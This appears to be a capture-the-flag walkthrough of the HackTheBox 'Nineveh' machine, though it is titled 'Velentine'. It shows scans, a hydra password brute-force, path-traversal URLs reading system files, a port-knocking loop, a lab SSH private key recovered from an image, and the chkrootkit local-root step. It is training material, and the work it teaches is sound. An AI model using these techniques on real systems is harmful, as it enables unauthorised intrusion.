---
title: Velentine - HackTheBox Walkthrough
date: 2021-11-07 12:00:00 
categories: [HackTheBox,Linux]
tags: [lfi,port knocking,pspy]
img_path: /assets/img/HTB/Nineveh/
image: 
  path: 00-banner.png
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Nineveh` a retired linux machine from HackTheBox rated medium. Without further ado, let’s begin.
# Recon
## Nmap Scan
As always we'll start with a nmap scan to discover the open ports and services.
```console
$cat nmap-scan
# Nmap 7.91 scan initiated Tue Nov  2 07:57:10 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.247.237
Nmap scan report for 10.129.247.237
Host is up (0.12s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:   d182 94b8 0210 7992 bf01 e802 b26f 8639
|_SHA-1: 2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  2 07:57:40 2021 -- 1 IP address (1 host up) scanned in 29.80 seconds
```

There two open ports:`80:http` and `443:https` and get the domain: `nineveh.htb`.

## HTTP Enumeration

Glancing the web:

![01-web](01-web.png)

Don't get much information so let's use `gobuster` to discover new directories or files.
```console
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://nineveh.htb/ -t 100 -x php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nineveh.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2021/11/01 15:51:55 Starting gobuster in directory enumeration mode
===============================================================
/info.php             (Status: 200) [Size: 83695]
/department           (Status: 301) [Size: 315] [--> http://nineveh.htb/department/]
/server-status        (Status: 403) [Size: 299]

===============================================================
2021/11/01 16:05:51 Finished
===============================================================
```
`/department` is a login page, trying common credentials we know `admin` is a valid username.

![02-web](02-web.png)

And on the source code we find other potencial username: `amrois`

![03-web](03-web.png)
## HTTPS Enumeration
And the other hand visiting the https page.

![04-web](04-web.png)

Just displays a image, without much things to do run gobuster.
```
$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://nineveh.htb/ -k -t 100 -x php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nineveh.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2021/11/01 16:06:54 Starting gobuster in directory enumeration mode
===============================================================
/db                   (Status: 301) [Size: 309] [--> https://nineveh.htb/db/]
/server-status        (Status: 403) [Size: 300]
/secure_notes         (Status: 301) [Size: 319] [--> https://nineveh.htb/secure_notes/]

===============================================================
2021/11/01 16:20:45 Finished
===============================================================
```

It finds two files. `/dev` is al phpLiteAdmin login

![05-web](05-web.png)

Which is vulnerable to a [Remote PHP Code Injection](https://www.exploit-db.com/exploits/24044) but to use it we need credentials.

![06-php](06-php.png)

`/secure_notes` displays a image:

![06-web](06-web.png)

Download it using wget.
```console
$wget https://nineveh.htb/secure_notes/nineveh.png --no-check-certificate
```

and checking its strings with `strings nineveh.png`, we get the amrois's id_rsa file.

```console
$strings nineveh.png
...[snip]...
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
secret/nineveh.pub
...[snip]...
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

The only problem with that is that the SSH port of the victime machine is close. Maybe later we will do a `port knocking` or a `port forwarding`, for now just change its permission to 600.
```console
$ chmod 600 id_rsa
```
# Initial Foothold
Getting back with the 80 port, let’s run hydra on the login form to try found the password for the user admin.

```plaintext
hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password\!"
```

![07-hydra](07-hydra.png)

User|Password
-|-
admin|1q2w3e4r5t

The URL use a file path as an argument, that why I thought in LFI.

![08-web](08-web.png)

The tricky thing is understand why a normal LFI bypass doesn't work

After some tries like:
- notes=../../../../../../etc/passwd
- notes=files/ninevehNotes/../../../../../etc/passwd
- notes=files/../../../../../etc/passwd
- notes=/ninevehNotes/../../../../etc/passwd

I could realize, the page seems to be checking that the string `ninevehNotes` is in the parameter, if not, it displays `No Note is selected.`

As we have the id_rsa for amrois, I wanted to know if the SSH port is open locally on the victim machine and we could know that just looking the content fo `/proc/net/tcp` file.
```plaintext
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../proc/net/tcp
```
The ports shows in hexadecimal, to converter it to decimal just use python.

![09-ports](09-ports.png)

We were right!! SSH port is open locally

![10-python](10-python.png)

Check the content of `/etc/knockd.conf` to see if there set some firewall rules to open/close the 22 port externally.
```plaintext
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../etc/knockd.conf
```
![11-knock](11-knock.png)

Voila!!, to open ssh port externally just need hit 571, 290, 911 ports in order.
```console
$ for i in 571 290 911; do nmap -Pn --max-retries 0 -p $i 10.129.247.237 >/dev/null ;done
```
![12-web](12-web.png)

# Privilage Escalation
Once we are in, upload pspy to check the proccess running

![13-pspy](13-pspy.png)

See `/usr/bin/chkrootkit` is running many times, luckily this binary has a [vulnerability](
https://lepetithacker.wordpress.com/2017/04/30/local-root-exploit-in-chkrootkit/), just need write a  reverse shell into `/tmp/update` file and make it executable.

![14-revshell](14-revshell.png)

The next time `chkroot` runs, We will get a shell.

![15-root](15-root.png)

That’s it for now guys. Until next time.

# Recourses

Topics|URL
-|-
Port Knocking|[https://wiki.archlinux.org/title/Port_knocking](https://wiki.archlinux.org/title/Port_knocking)
Knockd|[https://linux.die.net/man/1/knockd](https://linux.die.net/man/1/knockd)
